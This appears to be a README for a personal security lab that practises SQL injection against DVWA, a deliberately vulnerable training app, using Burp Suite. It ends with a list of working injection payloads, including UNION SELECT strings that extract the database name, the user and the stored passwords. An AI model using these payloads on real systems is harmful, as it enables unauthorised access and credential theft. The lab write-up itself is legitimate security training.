# 🔥 DVWA SQL Injection Lab (Burp Suite Practice)

## 📌 Overview
This project demonstrates SQL Injection attacks using DVWA and Burp Suite in a controlled lab environment.

It includes practical testing of:
- SQL Injection detection
- Boolean-based SQLi
- UNION-based SQLi
- Column enumeration
- Database extraction

---

## 🛠 Tools Used
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- Firefox Browser
- Kali Linux

---

## 📚 Skills Practiced
- HTTP request interception
- SQL Injection payload testing
- ORDER BY analysis
- UNION SELECT exploitation
- Database enumeration

---

## 🚀 Workflow

1. Open DVWA
2. Set Security Level to LOW
3. Intercept request using Burp Suite
4. Test SQL Injection payloads
5. Identify number of columns
6. Perform UNION-based injection
7. Extract database information

---

## 💉 Payloads Used

```text
1' OR '1'='1
1' ORDER BY 1--
1' ORDER BY 2--
1' UNION SELECT 1,2--
1' UNION SELECT database(),user()--
1' UNION SELECT user,password FROM users--
